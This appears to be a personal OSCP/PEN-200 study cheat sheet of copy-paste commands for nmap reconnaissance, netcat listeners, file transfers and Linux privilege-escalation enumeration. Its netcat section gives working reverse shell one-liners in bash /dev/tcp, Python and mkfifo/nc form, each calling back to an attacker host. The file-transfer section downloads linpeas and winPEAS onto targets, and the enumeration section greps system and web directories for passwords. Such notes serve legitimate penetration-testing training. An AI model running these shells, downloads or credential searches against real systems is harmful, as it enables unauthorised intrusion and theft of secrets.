---
tags:
  - oscp
  - cheatsheet
  - linux
  - nmap
  - netcat
created: 2026-07-31
linear_task: GIA-92
---

# ⚡ Foundational Command Cheat Sheet (Linux, Netcat, Nmap)

> **Quick Reference:** Fast copy-paste commands for initial reconnaissance, shell management, file transfers, and Linux CLI navigation.

---

## 💻 0. Kali Environment Setup & Shortcuts

```bash
# Kali Terminal Shortcut:
Ctrl + P   # Open terminal shortcut

# Connect to OffSec OpenVPN:
sudo openvpn universal.ovpn   # (Run inside offsec VPN directory)
```

---

## 🔍 1. Nmap Reconnaissance Commands

> [!info] 💡 Tool Context: **Nmap**
> - **What it is:** Network exploration and service discovery scanner.
> - **When to use:** First step on target IP to find open TCP/UDP ports, service versions (`-sV`), and OS types (`-O`).
> - **Why it's helpful:** Automates host discovery and initial vulnerability checks via NSE scripts (`-sC`).
> - **Pros:** Industry standard, highly versatile, supports all port ranges (`-p-`).
> - **Cons/Caveats:** SYN scans (`-sS`) require `sudo`; aggressive timing can crash legacy services or drop packets on weak VPN connections.

```bash
# 1. Quick Initial TCP Scan
sudo nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>

# 2. Fast Full-Port TCP Scan
sudo nmap -p- --min-rate 1000 -oN nmap_allports.txt <TARGET_IP>

# 3. Targeted Deep Scan on Open Ports
sudo nmap -p <PORTS> -sC -sV -A -oN nmap_targeted.txt <TARGET_IP>

# 4. UDP Quick Scan
sudo nmap -sU --top-ports 20 -oN nmap_udp.txt <TARGET_IP>

# 5. Extract Open Ports from Greppable Output
grep -E -o '([0-9]{1,5})/open' nmap_allports.gnmap | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//'
```

---

## 🐚 2. Netcat & Reverse Shell Handlers

> [!info] 💡 Tool Context: **Netcat (`nc`)**
> - **What it is:** Networking utility for reading and writing raw TCP/UDP data.
> - **When to use:** Catching reverse shells, testing port connectivity, and transferring files.
> - **Why it's helpful:** Preinstalled on almost all Linux environments; instant listener setup (`nc -nvlp 4444`).
> - **Pros:** Fast, lightweight, zero configuration required.
> - **Cons/Caveats:** Raw shells lack TTY (no tab auto-completion or `Ctrl+C` handling without PTY upgrade).

```bash
# Start Netcat Listener
nc -nvlp 4444

# Reverse Shell Payloads
# Bash
bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# NC OpenBSD (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f
```

### ⚡ Interactive TTY Shell Upgrade Checklist
```bash
# Step 1: In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background shell
Ctrl + Z

# Step 3: On Kali terminal
stty raw -echo; fg

# Step 4: Reset terminal
export TERM=xterm
stty rows 38 cols 160
```

---

## 📂 3. Fast File Transfers

```bash
# Kali: Start HTTP Server
python3 -m http.server 8000

# Target (Linux): Download file
curl http://<KALI_IP>:8000/linpeas.sh -o /tmp/linpeas.sh
wget http://<KALI_IP>:8000/linpeas.sh -O /tmp/linpeas.sh

# Target (Windows PowerShell): Download file
Invoke-WebRequest -Uri http://<KALI_IP>:8000/winPEAS.exe -OutFile C:\Windows\Tasks\winPEAS.exe
iwr -uri http://<KALI_IP>:8000/winPEAS.exe -OutFile C:\Windows\Tasks\winPEAS.exe
```

---

## 🛠️ 4. Essential Linux Enum One-Liners

> [!info] 💡 Tool Context: **`find`, `grep`, `awk`**
> - **What it is:** Native Unix filesystem search and text manipulation tools.
> - **When to use:** Local enumeration for privilege escalation (SUID binaries, writable files, passwords in configs).
> - **Why it's helpful:** Runs natively without leaving binary footprints on target targets.
> - **Pros:** Extremely fast and native.
> - **Cons/Caveats:** Requires precise regex and syntax to avoid overwhelming output (use `2>/dev/null`).

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find Writable Directories
find / -writable -type d 2>/dev/null

# Check Sudo Privileges
sudo -l

# Search for Passwords in Files
grep -rnw '/var/www/' -e 'password' 2>/dev/null
grep -rnw '/etc/' -e 'pass' 2>/dev/null
```

---

## 🔗 Related Notes
- [[06 PEN-200 Modules 1-5 Study Guide]]
- [[Template - Standalone Machine Target Note]]
